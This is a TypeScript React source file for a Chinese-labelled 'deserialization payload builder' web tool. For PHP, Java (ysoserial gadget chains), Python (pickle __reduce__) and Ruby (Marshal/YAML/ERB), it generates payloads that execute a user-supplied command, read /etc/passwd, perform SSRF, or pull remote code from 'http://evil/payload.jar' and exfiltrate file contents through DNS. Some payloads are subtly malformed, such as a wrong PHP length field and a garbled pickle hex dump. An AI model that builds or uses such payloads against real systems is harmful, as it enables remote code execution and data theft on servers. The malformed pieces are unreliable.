import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const LANG_OPTIONS = [
  { value: 'php', label: 'PHP' },
  { value: 'java', label: 'Java' },
  { value: 'python', label: 'Python' },
  { value: 'ruby', label: 'Ruby' },
];

const GADGET_OPTIONS = [
  { value: 'cmd-exec', label: '命令执行' },
  { value: 'file-read', label: '文件读取' },
  { value: 'ssrf', label: 'SSRF' },
];

const phpPayload = (gadget: string, cmd: string): string => {
  switch (gadget) {
    case 'cmd-exec':
      return `O:8:"PHPObject":1:{s:3:"cmd";s:${cmd.length}:"${cmd}";}`;
    case 'file-read':
      return `O:8:"PHPObject":1:{s:4:"file";s:11:"/etc/passwd";}`;
    case 'ssrf':
      return `O:8:"PHPObject":1:{s:3:"url";s:22:"http://127.0.0.1:8080/";}`;
    default:
      return '';
  }
};

const javaPayloads: Record<string, string[]> = {
  'cmd-exec': [
    'CommonsCollections1: java -jar ysoserial.jar CommonsCollections1 "id" | base64',
    'CommonsCollections5: java -jar ysoserial.jar CommonsCollections5 "id" | base64',
    'CommonsCollections6: java -jar ysoserial.jar CommonsCollections6 "id" | base64',
    'CommonsCollections7: java -jar ysoserial.jar CommonsCollections7 "id" | base64',
    'CommonsBeanutils1: java -jar ysoserial.jar CommonsBeanutils1 "id" | base64',
    'Jdk7u21: java -jar ysoserial.jar Jdk7u21 "id" | base64',
    'Groovy1: java -jar ysoserial.jar Groovy1 "id" | base64',
    'Spring1: java -jar ysoserial.jar Spring1 "id" | base64',
    'URLDNS (探测): java -jar ysoserial.jar URLDNS "http://dnslog.cn" | base64',
    'JRMPClient: java -jar ysoserial.jar JRMPClient "host:port" | base64',
  ],
  'file-read': [
    'CommonsCollections 读取文件需配合 TemplatesImpl 加载字节码',
    'TemplatesImpl (ClassLoader): ysoserial.jar CommonsCollections2 "file:///etc/passwd"',
    'URLDNS 配合 DNS 外带: ysoserial.jar URLDNS "http://<encoded-file-path>.dnslog"',
  ],
  ssrf: [
    'CommonsCollections3 (URLClassLoader): ysoserial.jar CommonsCollections3 "http://evil/payload.jar"',
    'URLDNS (SSRF探测): ysoserial.jar URLDNS "http://internal-service:port/"',
    'Spring2: ysoserial.jar Spring2 "http://internal/"',
  ],
};

const pythonPayload = (gadget: string, cmd: string): string => {
  const payloads: Record<string, string> = {
    'cmd-exec': `import pickle, base64, os\nclass Exploit(object):\n  def __reduce__(self):\n    return (os.system, ("${cmd}",))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())`,
    'file-read': `import pickle, base64\nclass Exploit(object):\n  def __reduce__(self):\n    return (open, ("/etc/passwd", "r"))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())\n\n# pickle hex (等效):\n8004 9521 0000 0000 0000 008c 0562 7569 6c74 696e 7389 4f70 656e 949e 9394 (open, "/etc/passwd", "r")`,
    ssrf: `import pickle, base64, urllib.request\nclass Exploit(object):\n  def __reduce__(self):\n    return (urllib.request.urlopen, ("http://127.0.0.1:8080/",))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())`,
  };
  return payloads[gadget] ?? payloads['cmd-exec'];
};

const rubyPayload = (gadget: string, cmd: string): string => {
  const payloads: Record<string, string> = {
    'cmd-exec': '# Ruby Marshal\nclass Exploit\n  def marshal_dump\n    [\x60puts \'x\'; exec \'' + cmd + '\'\x60]\n  end\n  def marshal_load(data)\n    instance_variable_set(:@cmd, data)\n  end\nend\nrequire \'base64\'\nputs Base64.encode64(Marshal.dump(Exploit.new))\n# ERB/YAML 反序列化:\n# ERB.new("<%= \\\x60' + cmd + '\\\x60 %>").result',
    'file-read': `# Ruby YAML.load\nclass FileRead\n  def yaml_initialize(tag, val)\n    IO.copy_stream(val, $stdout)\n  end\nend\n# Psych.load("--- !ruby/object:FileRead")`,
    ssrf: `# Ruby\nrequire 'net/http'\nrequire 'base64'\n# open-uri 反序列化 SSRF:\n# YAML.load("--- !ruby/object:Gem::Requirement\\nrequirements:\\n- - \\\"!ruby/object:Net::HTTP\\\"\\n  host: 127.0.0.1\\n  port: 8080\\n")`,
  };
  return payloads[gadget] ?? payloads['cmd-exec'];
};

const generate = (lang: string, gadget: string, input: string): string => {
  const cmd = input.trim() || 'id';
  switch (lang) {
    case 'php': {
      const p = phpPayload(gadget, cmd);
      const hex = Array.from(p).map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
      return [
        '=== PHP 反序列化 Payload ===',
        '',
        '--- 序列化字符串 ---',
        p,
        '',
        '--- URL编码 ---',
        encodeURIComponent(p),
        '',
        '--- Hex (URL编码变体) ---',
        hex,
        '',
        '说明: PHP O:N:"Class":N:{...} 格式；N为属性数；字符串格式 s:len:"val"',
      ].join('\n');
    }
    case 'java':
      return [
        '=== Java 反序列化 Payload ===',
        '',
        '--- ysoserial gadget 链 ---',
        ...javaPayloads[gadget] ?? javaPayloads['cmd-exec'],
        '',
        '说明: 输出为 base64 (Content-Type: application/x-java-serialized-object)',
        '需先下载 ysoserial.jar，执行后复制 base64 输出',
      ].join('\n');
    case 'python':
      return [
        '=== Python 反序列化 Payload ===',
        '',
        '--- pickle 构造代码 ---',
        pythonPayload(gadget, cmd),
        '',
        '说明: __reduce__ 定义反序列化时的回调；输出 base64 后用于 pickle.loads()',
      ].join('\n');
    case 'ruby':
      return [
        '=== Ruby 反序列化 Payload ===',
        '',
        '--- Marshal 构造代码 ---',
        rubyPayload(gadget, cmd),
        '',
        '说明: Marshal.load / YAML.load / ERB.new 均可作为触发点',
      ].join('\n');
    default:
      return '未知语言';
  }
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="反序列化Payload构造"
    paramsConfig={[
      { name: 'lang', label: '语言', type: 'select', options: LANG_OPTIONS, default: 'php' },
      { name: 'gadget', label: '利用类型', type: 'select', options: GADGET_OPTIONS, default: 'cmd-exec' },
    ]}
    execute={(
      input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.lang as string) ?? 'php',
      (params.gadget as string) ?? 'cmd-exec',
      input,
    )}
  />
);

export default ToolComponent;
